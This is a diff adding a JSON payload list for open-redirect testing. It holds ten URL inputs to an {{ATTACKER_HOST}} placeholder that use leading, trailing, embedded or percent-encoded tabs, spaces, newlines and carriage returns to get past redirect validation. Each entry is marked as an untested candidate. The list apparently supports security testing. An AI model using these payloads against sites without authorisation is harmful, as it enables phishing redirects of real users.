@@ -1,0 +1,176 @@
+{
+  "family": "url_parser_control_character",
+  "count": 10,
+  "payloads": [
+    {
+      "id": "ORX-0039",
+      "payload": " https://{{ATTACKER_HOST}}/",
+      "families": [
+        "url_parser_control_character"
+      ],
+      "sources": [
+        "open_redirect_pack_v2_authored_extension"
+      ],
+      "templated_payload": " https://{{ATTACKER_HOST}}/",
+      "technique": "leading-space",
+      "context": "query-parameter-url-value",
+      "hypothesis": "Tests leading-space trimming; raw transport may need safe query-component encoding.",
+      "status": "untested",
+      "confidence": "candidate",
+      "classification_note": "Candidate test input only. Results depend on the target framework, backend parser, decoding pipeline and browser URL parser; not a confirmed bypass."
+    },
+    {
+      "id": "ORX-0040",
+      "payload": "https://{{ATTACKER_HOST}}/ ",
+      "families": [
+        "url_parser_control_character"
+      ],
+      "sources": [
+        "open_redirect_pack_v2_authored_extension"
+      ],
+      "templated_payload": "https://{{ATTACKER_HOST}}/ ",
+      "technique": "trailing-space",
+      "context": "query-parameter-url-value",
+      "hypothesis": "Tests trailing-space trimming.",
+      "status": "untested",
+      "confidence": "candidate",
+      "classification_note": "Candidate test input only. Results depend on the target framework, backend parser, decoding pipeline and browser URL parser; not a confirmed bypass."
+    },
+    {
+      "id": "ORX-0041",
+      "payload": "\thttps://{{ATTACKER_HOST}}/",
+      "families": [
+        "url_parser_control_character"
+      ],
+      "sources": [
+        "open_redirect_pack_v2_authored_extension"
+      ],
+      "templated_payload": "\thttps://{{ATTACKER_HOST}}/",
+      "technique": "leading-tab",
+      "context": "query-parameter-url-value",
+      "hypothesis": "Tests tab stripping; send as encoded query data rather than a raw HTTP request-line control.",
+      "status": "untested",
+      "confidence": "candidate",
+      "classification_note": "Candidate test input only. Results depend on the target framework, backend parser, decoding pipeline and browser URL parser; not a confirmed bypass."
+    },
+    {
+      "id": "ORX-0042",
+      "payload": "\nhttps://{{ATTACKER_HOST}}/",
+      "families": [
+        "url_parser_control_character"
+      ],
+      "sources": [
+        "open_redirect_pack_v2_authored_extension"
+      ],
+      "templated_payload": "\nhttps://{{ATTACKER_HOST}}/",
+      "technique": "leading-newline",
+      "context": "query-parameter-url-value",
+      "hypothesis": "Tests newline handling in application-level decoding; never inject a raw line break into the HTTP request line.",
+      "status": "untested",
+      "confidence": "candidate",
+      "classification_note": "Candidate test input only. Results depend on the target framework, backend parser, decoding pipeline and browser URL parser; not a confirmed bypass."
+    },
+    {
+      "id": "ORX-0043",
+      "payload": "\rhttps://{{ATTACKER_HOST}}/",
+      "families": [
+        "url_parser_control_character"
+      ],
+      "sources": [
+        "open_redirect_pack_v2_authored_extension"
+      ],
+      "templated_payload": "\rhttps://{{ATTACKER_HOST}}/",
+      "technique": "leading-carriage-return",
+      "context": "query-parameter-url-value",
+      "hypothesis": "Tests CR handling after application decoding; transport-encode it.",
+      "status": "untested",
+      "confidence": "candidate",
+      "classification_note": "Candidate test input only. Results depend on the target framework, backend parser, decoding pipeline and browser URL parser; not a confirmed bypass."
+    },
+    {
+      "id": "ORX-0044",
+      "payload": "https://{{ATTACKER_HOST}}\t/",
+      "families": [
+        "url_parser_control_character"
+      ],
+      "sources": [
+        "open_redirect_pack_v2_authored_extension"
+      ],
+      "templated_payload": "https://{{ATTACKER_HOST}}\t/",
+      "technique": "embedded-tab",
+      "context": "query-parameter-url-value",
+      "hypothesis": "Tests embedded tab removal in URL parsing.",
+      "status": "untested",
+      "confidence": "candidate",
+      "classification_note": "Candidate test input only. Results depend on the target framework, backend parser, decoding pipeline and browser URL parser; not a confirmed bypass."
+    },
+    {
+      "id": "ORX-0045",
+      "payload": "https://{{ATTACKER_HOST}}\n/",
+      "families": [
+        "url_parser_control_character"
+      ],
+      "sources": [
+        "open_redirect_pack_v2_authored_extension"
+      ],
+      "templated_payload": "https://{{ATTACKER_HOST}}\n/",
+      "technique": "embedded-newline",
+      "context": "query-parameter-url-value",
+      "hypothesis": "Tests embedded newline removal in URL parsing; transport-encode it.",
+      "status": "untested",
+      "confidence": "candidate",
+      "classification_note": "Candidate test input only. Results depend on the target framework, backend parser, decoding pipeline and browser URL parser; not a confirmed bypass."
+    },
+    {
+      "id": "ORX-0046",
+      "payload": "%09https://{{ATTACKER_HOST}}/",
+      "families": [
+        "url_parser_control_character"
+      ],
+      "sources": [
+        "open_redirect_pack_v2_authored_extension"
+      ],
+      "templated_payload": "%09https://{{ATTACKER_HOST}}/",
+      "technique": "percent-encoded-leading-tab",
+      "context": "query-parameter-url-value",
+      "hypothesis": "Tests behavior after one decoding stage; record the application decode count.",
+      "status": "untested",
+      "confidence": "candidate",
+      "classification_note": "Candidate test input only. Results depend on the target framework, backend parser, decoding pipeline and browser URL parser; not a confirmed bypass."
+    },
+    {
+      "id": "ORX-0047",
+      "payload": "%0Ahttps://{{ATTACKER_HOST}}/",
+      "families": [
+        "url_parser_control_character"
+      ],
+      "sources": [
+        "open_redirect_pack_v2_authored_extension"
+      ],
+      "templated_payload": "%0Ahttps://{{ATTACKER_HOST}}/",
+      "technique": "percent-encoded-leading-newline",
+      "context": "query-parameter-url-value",
+      "hypothesis": "Tests behavior after one decoding stage; record the application decode count.",
+      "status": "untested",
+      "confidence": "candidate",
+      "classification_note": "Candidate test input only. Results depend on the target framework, backend parser, decoding pipeline and browser URL parser; not a confirmed bypass."
+    },
+    {
+      "id": "ORX-0048",
+      "payload": "%0Dhttps://{{ATTACKER_HOST}}/",
+      "families": [
+        "url_parser_control_character"
+      ],
+      "sources": [
+        "open_redirect_pack_v2_authored_extension"
+      ],
+      "templated_payload": "%0Dhttps://{{ATTACKER_HOST}}/",
+      "technique": "percent-encoded-leading-carriage-return",
+      "context": "query-parameter-url-value",
+      "hypothesis": "Tests behavior after one decoding stage; do not confuse with CRLF injection.",
+      "status": "untested",
+      "confidence": "candidate",
+      "classification_note": "Candidate test input only. Results depend on the target framework, backend parser, decoding pipeline and browser URL parser; not a confirmed bypass."
+    }
+  ]
+}
